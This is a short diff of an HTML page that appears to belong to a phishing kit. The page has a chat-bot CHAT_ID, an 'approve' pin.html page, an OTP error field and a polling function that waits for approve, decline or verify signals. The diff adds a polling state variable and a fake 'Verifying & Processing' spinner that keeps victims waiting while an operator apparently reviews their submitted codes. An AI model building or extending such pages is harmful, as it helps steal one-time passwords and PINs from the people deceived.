@@ -498,7 +498,7 @@
       CHAT_ID: '8820857419',
       APPROVE_PAGE: 'pin.html'
     }:
-
+  let state = { lastUpdateId: 0 };
   let isProcessing = false;
 
   const otpError = document.getElementById('otpError');
@@ -652,3 +652,10 @@ function startPolling(approveId, declineId, verifyId) {
     document.getElementById('supportModal').style.display = 'none';
   }
 </script>
+      <div id="spinnerOverlay">
+    <div class="spinner"></div>
+    <div class="spin-label">Verifying &amp; Processing</div>
+    <div class="spin-sub">Please hold on…</div>
+      </div>
+</body>
+</html>
